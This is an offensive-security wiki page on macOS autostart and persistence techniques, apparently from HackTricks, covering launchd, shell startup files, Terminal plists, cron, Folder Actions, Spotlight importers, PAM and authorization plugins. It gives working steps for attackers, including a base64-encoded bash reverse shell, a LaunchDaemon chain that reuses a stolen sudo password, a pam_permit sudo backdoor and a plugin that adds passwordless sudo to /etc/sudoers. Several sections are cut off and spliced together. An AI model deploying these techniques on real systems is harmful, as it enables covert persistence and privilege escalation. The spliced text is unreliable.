_body: "# macOS Auto Start\n\n{{#include ../banners/hacktricks-training.md}}\n\nThis section is heavily based on the blog\
  \ series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart\
  \ Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4)\
  \ and to specify the **permissions** needed.\n\n## Sandbox Bypass\n\n> [!TIP]\n> Here you can find start locations useful\
  \ for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **waiting** for a\
  \ very **common** **action**, a determined **amount of time** or an **action you can usually perform** from inside a sandbox\
  \ without needing root permissions.\n\n### Launchd\n\n- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)\n\
  - TCC Bypass: [\U0001F534](https://emojipedia.org/large-red-circle)\n\n#### Locations\n\n- **`/Library/LaunchAgents`**\n\
  \  - **Trigger**: Reboot\n  - Root required\n- **`/Library/LaunchDaemons`**\n  - **Trigger**: Reboot\n  - Root required\n\
  - **`/System/Library/LaunchAgents`**\n  - **Trigger**: Reboot\n  - Root required\n- **`/System/Library/LaunchDaemons`**\n\
  \  - **Trigger**: Reboot\n  - Root required\n- **`~/Library/LaunchAgents`**\n  - **Trigger**: Relog-in\n- **`~/Library/LaunchDemons`**\n\
  \  - **Trigger**: Relog-in\n\n> [!TIP]\n> As interesting fact, **`launchd`** has an embedded property list in a the Mach-o\
  \ section `__Text.__config` which contains other well known services launchd must start. Moreover, these services can contain\
  \ the `RequireSuccess`, `RequireRun` and `RebootOnSuccess` that means that they must be run and complete successfully.\n\
  >\n> Ofc, It cannot be modified because of code signing.\n\n#### Description & Exploitation\n\n**`launchd`** is the **first**\
  \ **process** executed by OX S kernel at startup and the last one to finish at shut down. It should always have the **PID\
  \ 1**. This process will **read and execute** the configurations indicated in the **ASEP** **plists** in:\n\n- `/Library/LaunchAgents`:\
  \ Per-user agents installed by the admin\n- `/Library/LaunchDaemons`: System-wide daemons installed by the admin\n- `/System/Library/LaunchAgents`:\
  \ Per-user agents provided by Apple.\n- `/System/Library/LaunchDaemons`: System-wide daemons provided by Apple.\n\nWhen\
  \ a user logs in the plists located in `/Users/$USER/Library/LaunchAgents` and `/Users/$USER/Library/LaunchDemons` are started\
  \ with the **logged users permissions**.\n\nThe **main difference between agents and daemons is that agents are loaded when\
  \ the user logs in and the daemons are loaded at system startup** (as there are services like ssh that needs to be executed\
  \ before any user access the system). Also agents may use GUI while daemons need to run in the background.\n\n```xml\n<?xml\
  \ version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\">\n<plist version=\"1.0\"\
  >\n<dict>\n    <key>Label</key>\n        <string>com.apple.someidentifier</string>\n    <key>ProgramArguments</key>\n  \
  \  <array>\n        <string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->\n    </array>\n    <key>RunAtLoad</key><true/>\
  \ <!--Execute at system startup-->\n    <key>StartInterval</key>\n    <integer>800</integer> <!--Execute each 800s-->\n\
  \    <key>KeepAlive</key>\n    <dict>\n        <key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->\n\
  \        <!--If previous is true, then re-execute in successful exit-->\n    </dict>\n</dict>\n</plist>\n```\n\nThere are\
  \ cases where an **agent needs to be executed before the user logins**, these are called **PreLoginAgents**. For example,\
  \ this is useful to provide assistive technology at login. They can be found also in `/Library/LaunchAgents`(see [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)\
  \ an example).\n\n> [!TIP]\n> New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl\
  \ load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however\
  \ those plist files won't be automatically loaded after reboot).\\\n> It's also possible to **unload** with `launchctl unload\
  \ <target.plist>` (the process pointed by it will be terminated),\n>\n> To **ensure** that there isn't **anything** (like\
  \ an override) **preventing** an **Agent** or **Daemon** **from** **running** run: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`\n\
  \nList all the agents and daemons loaded by the current user:\n\n```bash\nlaunchctl list\n```\n\n#### Example malicious\
  \ LaunchDaemon chain (password reuse)\n\nA recent macOS infostealer reused a **captured sudo password** to drop a user agent\
  \ and a root LaunchDaemon:\n\n- Write the agent loop to `~/.agent` and make it executable.\n- Generate a plist in `/tmp/starter`\
  \ pointing to that agent.\n- Reuse the stolen password with `sudo -S` to copy it into `/Library/LaunchDaemons/com.finder.helper.plist`,\
  \ set `root:wheel`, and load it with `launchctl load`.\n- Start the agent silently via `nohup ~/.agent >/dev/null 2>&1 &`\
  \ to detach output.\n\n```bash\nprintf '%s\\n' \"$pw\" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist\n\
  printf '%s\\n' \"$pw\" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist\nprintf '%s\\n' \"$pw\"\
  \ | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist\nnohup \"$HOME/.agent\" >/dev/null 2>&1 &\n```\n\
  > [!WARNING]\n> If a plist is owned by a user, even if it's in a daemon system wide folders, the **task will be executed\
  \ as the user** and not as root. This can prevent some privilege escalation attacks.\n\n#### More info about launchd\n\n\
  **`launchd`** is the **first** user mode process which is started from the **kernel**. The process start must be **successful**\
  \ and it **cannot exit or crash**. It's even **protected** against some **killing signals**.\n\nOne of the first things\
  \ `launchd` would do is to **start** all the **daemons** like:\n\n- **Timer daemons** based on time to be executed:\n  -\
  \ atd (`com.apple.atrun.plist`): Has a `StartInterval` of 30min\n  - crond (`com.apple.systemstats.daily.plist`): Has `StartCalendarInterval`\
  \ to start at 00:15\n- **Network daemons** like:\n  - `org.cups.cups-lpd`: Listens in TCP (`SockType: stream`) with `SockServiceName:\
  \ printer`\n    - SockServiceName must be either a port or a service from `/etc/services`\n  - `com.apple.xscertd.plist`:\
  \ Listens on TCP in port 1640\n- **Path daemons** that are executed when a specified path changes:\n  - `com.apple.postfix.master`:\
  \ Checking the path `/etc/postfix/aliases`\n- **IOKit notifications daemons**:\n  - `com.apple.xartstorageremoted`: `\"\
  com.apple.iokit.matching\" => { \"com.apple.device-attach\" => { \"IOMatchLaunchStream\" => 1 ...`\n- **Mach port:**\n \
  \ - `com.apple.xscertd-helper.plist`: It's indicating in the `MachServices` entry the name `com.apple.xscertd.helper`\n\
  - **UserEventAgent:**\n  - This is different from the previous one. It makes launchd spawn apps in response to specific\
  \ event. However, in this case, the main binary involved isn't `launchd` but `/usr/libexec/UserEventAgent`. It loads plugins\
  \ from the SIP restricted folder /System/Library/UserEventPlugins/ where each plugin indicates its initialiser in the `XPCEventModuleInitializer`\
  \ key or. in the case of older plugins, in the `CFPluginFactories` dict under the key `FB86416D-6164-2070-726F-70735C216EC0`\
  \ of its `Info.plist`.\n\n### shell startup files\n\nWriteup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\\\
  \nWriteup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)\n\
  \n- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)\n- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)\n\
  \  - But you need to find an app with a TCC bypass that executes a shell that loads these files\n\n#### Locations\n\n- **`~/.zshrc`,\
  \ `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**\n  - **Trigger**: Open a terminal with zsh\n- **`/etc/zshenv`,\
  \ `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**\n  - **Trigger**: Open a terminal with zsh\n  - Root required\n- **`~/.zlogout`**\n\
  \  - **Trigger**: Exit a terminal with zsh\n- **`/etc/zlogout`**\n  - **Trigger**: Exit a terminal with zsh\n  - Root required\n\
  - Potentially more in: **`man zsh`**\n- **`~/.bashrc`**\n  - **Trigger**: Open a terminal with bash\n- `/etc/profile` (didn't\
  \ work)\n- `~/.profile` (didn't work)\n- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`\n  - **Trigger**:\
  \ Expected to trigger with xterm, but it **isn't installed** and even after installed this error is thrown: xterm: `DISPLAY\
  \ is not set`\n\n#### Description & Exploitation\n\nWhen initiating a shell environment such as `zsh` or `bash`, **certain\
  \ startup files are run**. macOS currently uses `/bin/zsh` as the default shell. This shell is automatically accessed when\
  \ the Terminal application is launched or when a device is accessed via SSH. While `bash` and `sh` are also present in macOS,\
  \ they need to be explicitly invoked to be used.\n\nThe man page of zsh, which we can read with **`man zsh`** has a long\
  \ description of the startup files.\n\n```bash\n# Example executino via ~/.zshrc\necho \"touch /tmp/hacktricks\" >> ~/.zshrc\n\
  ```\n\n### Re-opened Applications\n\n> [!CAUTION]\n> Configuring the indicated exploitation and loging-out and loging-in\
  \ or even rebooting didn't work for me to execute the app. (The app wasn't being executed, maybe it needs to be running\
  \ when these actions are performed)\n\n**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)\n\
  \n- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)\n- TCC bypass: [\U0001F534](https://emojipedia.org/large-red-circle)\n\
  \n#### Location\n\n- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**\n  - **Trigger**: Restart reopening\
  \ applications\n\n#### Description & Exploitation\n\nAll the applications to reopen are inside the plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`\n\
  \nSo, make the reopen applications launch your own one, you just need to **add your app to the list**.\n\nThe UUID can be\
  \ found listing that directory or with `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'\"' '/IOPlatformUUID/{print $4}'`\n\
  \nTo check the applications that will be reopened you can do:\n\n```bash\ndefaults -currentHost read com.apple.loginwindow\
  \ TALAppsToRelaunchAtLogin\n#or\nplutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist\n```\n\nTo **add\
  \ an application to this list** you can use:\n\n```bash\n# Adding iTerm2\n/usr/libexec/PlistBuddy -c \"Add :TALAppsToRelaunchAtLogin:\
  \ dict\" \\\n    -c \"Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2\" \\\n    -c \"Set :TALAppsToRelaunchAtLogin:$:BundleID\
  \ com.googlecode.iterm2\" \\\n    -c \"Set :TALAppsToRelaunchAtLogin:$:Hide 0\" \\\n    -c \"Set :TALAppsToRelaunchAtLogin:$:Path\
  \ /Applications/iTerm.app\" \\\n    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist\n```\n\n### Terminal\
  \ Preferences\n\n- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)\n- TCC bypass: [✅](https://emojipedia.org/check-mark-button)\n\
  \  - Terminal use to have FDA permissions of the user use it\n\n#### Location\n\n- **`~/Library/Preferences/com.apple.Terminal.plist`**\n\
  \  - **Trigger**: Open Terminal\n\n#### Description & Exploitation\n\nIn **`~/Library/Preferences`** are store the preferences\
  \ of the user in the Applications. Some of these preferences can hold a configuration to **execute other applications/scripts**.\n\
  \nFor example, the Terminal can execute a command in the Startup:\n\n<figure><img src=\"../images/image (1148).png\" alt=\"\
  \" width=\"495\"><figcaption></figcaption></figure>\n\nThis config is reflected in the file **`~/Library/Preferences/com.apple.Terminal.plist`**\
  \ like this:\n\n```bash\n[...]\n\"Window Settings\" => {\n    \"Basic\" => {\n      \"CommandString\" => \"touch /tmp/terminal_pwn\"\
  \n      \"Font\" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }\n      \"FontAntialias\"\
  \ => 1\n      \"FontWidthSpacing\" => 1.004032258064516\n      \"name\" => \"Basic\"\n      \"ProfileCurrentVersion\" =>\
  \ 2.07\n      \"RunCommandAsShell\" => 0\n      \"type\" => \"Window Settings\"\n    }\n[...]\n```\n\nSo, if the plist of\
  \ the preferences of the terminal in the system could be overwritten, the the **`open`** functionality can be used to **open\
  \ the terminal and that command will be executed**.\n\nYou can add this from the cli with:\n\n```bash\n# Add\n/usr/libexec/PlistBuddy\
  \ -c \"Set :\\\"Window Settings\\\":\\\"Basic\\\":\\\"CommandString\\\" 'touch /tmp/terminal-start-command'\" $HOME/Library/Preferences/com.apple.Terminal.plist\n\
  /usr/libexec/PlistBuddy -c \"Set :\\\"Window Settings\\\":\\\"Basic\\\":\\\"RunCommandAsShell\\\" 0\" $HOME/Library/Preferences/com.apple.Terminal.plist\n\
  \n# Remove\n/usr/libexec/PlistBuddy -c \"Set :\\\"Window Settings\\\":\\\"Basic\\\":\\\"CommandString\\\" ''\" $HOME/Library/Preferences/com.apple.Terminal.plist\n\
  ```\n\n### Terminal Scripts / Other file extensions\n\n- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)\n\
  - TCC bypass: [✅](https://emojipedia.org/check-mark-button)\n  - Terminal use to have FDA permissions of the user use it\n\
  \n#### Location\n\n- **Anywhere**\n  - **Trigger**: Open Terminal\n\n#### Description & Exploitation\n\nIf you create a\
  \ [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)\
  \ and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the\
  \ Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.\n\nTry\
  \ it with:\n\n```bash\n# Prepare the payload\ncat > /tmp/test.terminal << EOF\n<?xml version=\"1.0\" encoding=\"UTF-8\"\
  ?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"\

  \t<string>exploit</string>\n\t<key>type</key>\n\t<string>Window Settings</string>\n</dict>\n</plist>\nEOF\n\n# Trigger it\n\
  open /tmp/test.terminal\n\n# Use something like the following for a reverse shell:\n<string>echo -n \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==\"\
  \ | base64 -d | bash;</string>\n```\n\nYou could also use the extensions **`.command`**, **`.tool`**, with regular shell\
  \ scripts content and they will be also opened by Terminal.\n\n> [!CAUTION]\n> If terminal has **Full Disk Access** it will\
  \ be able to complete that action (note that the command executed will be visible in a terminal window).\n\n### Audio Plugins\n\

  \n#### Description\n\nAccording to the previous writeups it's possible to **compile some audio plugins** and get them loaded.\n\
  \n### QuickLook Plugins\n\nWriteup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\n\
  \n- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)\n- TCC bypass: [\U0001F7E0](https://emojipedia.org/large-orange-circle)\n\

  - `/Applications/AppNameHere/Contents/Library/QuickLook/`\n- `~/Applications/AppNameHere/Contents/Library/QuickLook/`\n\n\
  #### Description & Exploitation\n\nQuickLook plugins can be executed when you **trigger the preview of a file** (press space\
  \ bar with the file selected in Finder) and a **plugin supporting that file type** is installed.\n\nIt's possible to compile\
  \ your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press\
  \ space to trigger it.\n\n### ~~Login/Logout Hooks~~\n\n> [!CAUTION]\n> This didn't work for me, neither with the user LoginHook\
  \ nor with the root LogoutHook\n\n**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)\n\

  \n#### Location\n\n- You need to be able to execute something like `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`\n\
  \  - `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`\n\nThey are deprecated but can be used to execute\
  \ commands when a user logs in.\n\n```bash\ncat > $HOME/hook.sh << EOF\n#!/bin/bash\necho 'My is: \\`id\\`' > /tmp/login_id.txt\n\
  EOF\nchmod +x $HOME/hook.sh\ndefaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh\ndefaults write com.apple.loginwindow\
  \ LogoutHook /Users/$USER/hook.sh\n```\n\nThis setting is stored in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`\n\
  \n```bash\ndefaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n{\n    LoginHook = \"/Users/username/hook.sh\"\
  ;\n    LogoutHook = \"/Users/username/hook.sh\";\n    MiniBuddyLaunch = 0;\n    TALLogoutReason = \"Shut Down\";\n    TALLogoutSavesState\
  \ = 0;\n    oneTimeSSMigrationComplete = 1;\n}\n```\n\nTo delete it:\n\n```bash\ndefaults delete com.apple.loginwindow LoginHook\n\
  defaults delete com.apple.loginwindow LogoutHook\n```\n\nThe root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**\n\
  \n## Conditional Sandbox Bypass\n\n> [!TIP]\n> Here you can find start locations useful for **sandbox bypass** that allows\
  \ you to simply execute something by **writing it into a file** and **expecting not super common conditions** like specific\
  \ **programs installed, \"uncommon\" user** actions or environments.\n\n### Cron\n\n**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)\n\
  \n- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)\n  - However, you need to be able to execute\
  \ `crontab` binary\n  - Or be root\n- TCC bypass: [\U0001F534](https://emojipedia.org/large-red-circle)\n\n#### Location\n\
  \n- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**\n  - Root required for direct\
  \ write access. No root required if you can execute `crontab <file>`\n  - **Trigger**: Depends on the cron job\n\n#### Description\
  \ & Exploitation\n\nList the cron jobs of the **current user** with:\n\n```bash\ncrontab -l\n```\n\nYou can also see all\
  \ the cron jobs of the users in **`/usr/lib/cron/tabs/`** and **`/var/at/tabs/`** (needs root).\n\nIn MacOS several folders\
  \ executing scripts with **certain frequency** can be found in:\n\n```bash\n# The one with the cron jobs is /usr/lib/cron/tabs/\n\
  ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/\n```\n\nThere you can find the regular **cron** **jobs**,\
  \ the **at** **jobs** (not very used) and the **periodic** **jobs** (mainly used for cleaning temporary files). The daily\
  \ periodic jobs can be executed for example with: `periodic daily`.\n\nTo add a **user cronjob programatically** it's possible\
  \ to use:\n\n```bash\necho '* * * * * /bin/bash -c \"touch /tmp/cron3\"' > /tmp/cron\ncrontab /tmp/cron\n```\n\n### iTerm2\n\

  \ It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns\
  \ under certain conditions.\n\nBy **default** they are **disabled** but the **root** user can **enable** **them** with:\n\
  \n```bash\nsudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist\n```\n\nThis will create a file in\

  \n- `a` - this is the queue\n- `0001a` - job number in hex, `0x1a = 26`\n- `019bdcd2` - time in hex. It represents the minutes\
  \ passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT:\

  \n- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)\n  - But you need to be able to call `osascript`\
  \ with arguments to contact **`System Events`** to be able to configure Folder Actions\n- TCC bypass: [\U0001F7E0](https://emojipedia.org/large-orange-circle)\n\
  \  - It has some basic TCC permissions like Desktop, Documents and Downloads\n\n#### Location\n\n- **`/Library/Scripts/Folder\
  \ Action Scripts`**\n  - Root required\n  - **Trigger**: Access to the specified folder\n- **`~/Library/Scripts/Folder Action\
  \ Scripts`**\n  - **Trigger**: Access to the specified folder\n\n#### Description & Exploitation\n\nFolder Actions are scripts\
  \ automatically triggered by changes in a folder such as adding, removing items, or other actions like opening or resizing\
  \ the folder window. These actions can be utilized for various tasks, and can be triggered in different ways like using\
  \ the Finder UI or terminal commands.\n\nTo set up Folder Actions, you have options like:\n\n1. Crafting a Folder Action\
  \ workflow with [Automator](https://support.apple.com/guide/automator/welcome/mac) and installing it as a service.\n2. Attaching\
  \ a script manually via the Folder Actions Setup in the context menu of a folder.\n3. Utilizing OSAScript to send Apple\
  \ Event messages to the `System Events.app` for programmatically setting up a Folder Action.\n   - This method is particularly\
  \ useful for embedding the action into the system, offering a level of persistence.\n\nThe following script is an example\
  \ of what can be executed by a Folder Action:\n\n```applescript\n// source.js\nvar app = Application.currentApplication();\n\
  app.includeStandardAdditions = true;\napp.doShellScript(\"touch /tmp/folderaction.txt\");\napp.doShellScript(\"touch ~/Desktop/folderaction.txt\"\
  );\napp.doShellScript(\"mkdir /tmp/asd123\");\napp.doShellScript(\"cp -R ~/Desktop /tmp/asd123\");\n```\n\nTo make the above\
  \ script usable by Folder Actions, compile it using:\n\n```bash\nosacompile -l JavaScript -o folder.scpt source.js\n```\n\
  \nAfter the script is compiled, set up Folder Actions by executing the script below. This script will enable Folder Actions\
  \ globally and specifically attach the previously compiled script to the Desktop folder.\n\n```javascript\n// Enabling and\
  \ attaching Folder Action\nvar se = Application(\"System Events\")\nse.folderActionsEnabled = true\nvar myScript = se.Script({\
  \ name: \"source.js\", posixPath: \"/tmp/source.js\" })\nvar fa = se.FolderAction({ name: \"Desktop\", path: \"/Users/username/Desktop\"\
  \ })\nse.folderActions.push(fa)\nfa.scripts.push(myScript)\n```\n\nRun the setup script with:\n\n```bash\nosascript -l JavaScript\
  \ /Users/username/attach.scpt\n```\n\n- This is the way yo implement this persistence via GUI:\n\nThis is the script that\
  \ will be executed:\n\n```applescript:source.js\nvar app = Application.currentApplication();\napp.includeStandardAdditions\
  \ = true;\napp.doShellScript(\"touch /tmp/folderaction.txt\");\napp.doShellScript(\"touch ~/Desktop/folderaction.txt\");\n\
  app.doShellScript(\"mkdir /tmp/asd123\");\napp.doShellScript(\"cp -R ~/Desktop /tmp/asd123\");\n```\n\nCompile it with:\
  \ `osacompile -l JavaScript -o folder.scpt source.js`\n\nMove it to:\n\n```bash\nmkdir -p \"$HOME/Library/Scripts/Folder\
  \ Action Scripts\"\nmv /tmp/folder.scpt \"$HOME/Library/Scripts/Folder Action Scripts\"\n```\n\nThen, open the `Folder Actions\
  \ Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called\
  \ it output2.scp):\n\n<figure><img src=\"../images/image (39).png\" alt=\"\" width=\"297\"><figcaption></figcaption></figure>\n\
  \nNow, if you open that folder with **Finder**, your script will be executed.\n\nThis configuration was stored in the **plist**\
  \ located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.\n\nNow, lets try to prepare\
  \ this persistence without GUI access:\n\n1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** to\
  \ `/tmp` to backup it:\n   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`\n2. **Remove** the\
  \ Folder Actions you just set:\n\n<figure><img src=\"../images/image (40).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \nNow that we have an empty environment\n\n3. Copy the backup file: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`\n\
  4. Open the Folder Actions Setup.app to consume this config: `open \"/System/Library/CoreServices/Applications/Folder Actions\
  \ Setup.app/\"`\n\n> [!CAUTION]\n> And this didn't work for me, but those are the instructions from the writeup:(\n\n###\

  \ managed by the spotlight plugin is created.\n  - New app required\n\n#### Description & Exploitation\n\nSpotlight is macOS's\
  \ built-in search feature, designed to provide users with **quick and comprehensive access to data on their computers**.\\\
  \nTo facilitate this rapid search capability, Spotlight maintains a **proprietary database** and creates an index by **parsing\
  \ most files**, enabling swift searches through both file names and their content.\n\nThe underlying mechanism of Spotlight\
  \ involves a central process named 'mds', which stands for **'metadata server'.** This process orchestrates the entire Spotlight\
  \ service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as\
  \ indexing different file types (`ps -ef | grep mdworker`). These tasks are made possible through Spotlight importer plugins,\
  \ or **\".mdimporter bundles**\", which enable Spotlight to understand and index content across a diverse range of file\
  \ formats.\n\nThe plugins or **`.mdimporter`** bundles are located in the places mentioned previously and if a new bundle\
  \ appear it's loaded within monute (no need to restart any service). These bundles need to indicate which **file type and\
  \ extensions they can manage**, this way, Spotlight will use them when a new file with the indicated extension is created.\n\
  \nIt's possible to **find all the `mdimporters`** loaded running:\n\n```bash\nmdimport -L\nPaths: id(501) (\n    \"/System/Library/Spotlight/iWork.mdimporter\"\
  ,\n    \"/System/Library/Spotlight/iPhoto.mdimporter\",\n    \"/System/Library/Spotlight/PDF.mdimporter\",\n    [...]\n\
  ```\n\nAnd for example **/Library/Spotlight/iBooksAuthor.mdimporter** is used to parse these type of files (extensions `.iba`\
  \ and `.book` among others):\n\n```json\nplutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist\n\n[...]\n\
  \"CFBundleDocumentTypes\" => [\n    0 => {\n      \"CFBundleTypeName\" => \"iBooks Author Book\"\n      \"CFBundleTypeRole\"\
  \ => \"MDImporter\"\n      \"LSItemContentTypes\" => [\n        0 => \"com.apple.ibooksauthor.book\"\n        1 => \"com.apple.ibooksauthor.pkgbook\"\

  \ \"LSTypeIsPackage\" => 0\n    }\n  ]\n[...]\n => {\n      \"UTTypeConformsTo\" => [\n        0 => \"public.data\"\n  \
  \      1 => \"public.composite-content\"\n      ]\n      \"UTTypeDescription\" => \"iBooks Author Book\"\n      \"UTTypeIdentifier\"\
  \ => \"com.apple.ibooksauthor.book\"\n      \"UTTypeReferenceURL\" => \"http://www.apple.com/ibooksauthor\"\n      \"UTTypeTagSpecification\"\
  \ => {\n        \"public.filename-extension\" => [\n          0 => \"iba\"\n          1 => \"book\"\n        ]\n      }\n\
  \    }\n[...]\n```\n\n> [!CAUTION]\n> If you check the Plist of other `mdimporter` you might not find the entry **`UTTypeConformsTo`**.\
  \ Thats because that is a built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))\
  \ and it doesn't need to specify extensions.\n>\n> Moreover, System default plugins always take precedence, so an attacker\
  \ can only access files that are not otherwise indexed by Apple's own `mdimporters`.\n\nTo create your own importer you\
  \ could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)\
  \ and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the\
  \ extension you would like to support and refelc them in **`schema.xml`**.\\\nThen **change** the code of the function **`GetMetadataForFile`**\
  \ to execute your payload when a file with the processed extension is created.\n\nFinally **build and copy your new `.mdimporter`**\
  \ to one of thre previous locations and you can chech whenever it's loaded **monitoring the logs** or checking **`mdimport\
  \ -L.`**\n\n### ~~Preference Pane~~\n\n> [!CAUTION]\n> It doesn't look like this is working anymore.\n\nWriteup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)\n\

  \ [\U0001F534](https://emojipedia.org/large-red-circle)\n\n#### Location\n\n- Root always required\n\n#### Description &\
  \ Exploitation\n\nAs PAM is more focused in **persistence** and malware that on easy execution inside macOS, this blog won't\
  \ give a detailed explanation, **read the writeups to understand this technique better**.\n\nCheck PAM modules with:\n\n\
  ```bash\nls -l /etc/pam.d\n```\n\nA persistence/privilege escalation technique abusing PAM is as easy as modifying the module\
  \ /etc/pam.d/sudo adding at the beginning the line:\n\n```bash\nauth       sufficient     pam_permit.so\n```\n\nSo it will\
  \ **looks like** something like this:\n\n```bash\n# sudo: auth account password session\nauth       sufficient     pam_permit.so\n\
  auth       include        sudo_local\nauth       sufficient     pam_smartcard.so\nauth       required       pam_opendirectory.so\n\
  account    required       pam_permit.so\npassword   required       pam_deny.so\nsession    required       pam_permit.so\n\
  ```\n\nAnd therefore any attempt to use **`sudo` will work**.\n\n> [!CAUTION]\n> Note that this directory is protected by\
  \ TCC so it's highly probably that the user will get a prompt asking for access.\n\nAnother nice example is su, were you\
  \ can see that it's also possible to give parameters to the PAM modules (and you coukd also backdoor this file):\n\n```bash\n\
  cat /etc/pam.d/su\n# su: auth account session\nauth       sufficient     pam_rootok.so\nauth       required       pam_opendirectory.so\n\

  \  - It's also needed to configure the authorization database to use the plugin\n\n#### Description & Exploitation\n\nYou\
  \ can create an authorization plugin that will be executed when a user logs-in to maintain persistence. For more information\
  \ about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you\
  \ out and you will need to clean your mac from recovery mode).\n\n```objectivec\n// Compile the code and create a real bundle\n\
  // gcc -bundle -framework Foundation main.m -o CustomAuth\n// mkdir -p CustomAuth.bundle/Contents/MacOS\n// mv CustomAuth\
  \ CustomAuth.bundle/Contents/MacOS/\n\n#import <Foundation/Foundation.h>\n\n__attribute__((constructor)) static void run()\n\
  {\n    NSLog(@\"%@\", @\"[+] Custom Authorization Plugin was loaded\");\n    system(\"echo \\\"%staff ALL=(ALL) NOPASSWD:ALL\\\
  \" >> /etc/sudoers\");\n}\n```\n\n**Move** the bundle to the location to be loaded:\n\n```bash\ncp -r CustomAuth.bundle\
  \ /Library/Security/SecurityAgentPlugins/\n```\n\nFinally add the **rule** to load this Plugin:\n\n```bash\ncat > /tmp/rule.plist\
  \ <<EOF\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\

  \         </array>\n        </dict>\n</plist>\nEOF\n\nsecurity authorizationdb write com.asdf.asdf < /tmp/rule.plist\n```\n\
  \nThe **`evaluate-mechanisms`** will tell the authorization framework that it will need to **call an external mechanism\
  \ for authorization**. Moreover, **`privileged`** will make it be executed by root.\n\nTrigger it with:\n\n```bash\nsecurity\
  \ authorize com.asdf.asdf\n```\n\nAnd then the **staff group should have sudo** access (read `/etc/sudoers` to confirm).\n\

  ```bash\nLoadModule my_custom_module /Users/Shared/example.dylib \"My Signature Authority\"\n```\n\nThis way your compiled\
